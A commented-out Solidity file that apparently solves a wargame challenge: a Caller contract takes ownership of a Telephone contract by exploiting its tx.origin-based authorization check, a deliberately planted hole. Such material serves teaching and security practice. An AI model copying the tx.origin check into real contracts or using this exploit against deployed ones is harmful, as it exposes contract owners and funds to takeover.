// // SPDX-License-Identifier: MIT
// pragma solidity ^0.8.0;

// contract Caller {
  
//   constructor () {
//   }

//   function callTelephone (address _test, address _owner) external {
//     Telephone(_test).changeOwner(_owner);
//   }
// }
// contract Telephone {
//     address public owner;

//     constructor() {
//         owner = msg.sender;
//     }

//     function changeOwner(address _owner) public {
//         if (tx.origin != msg.sender) {
//             owner = _owner;
//         }
//     }
// }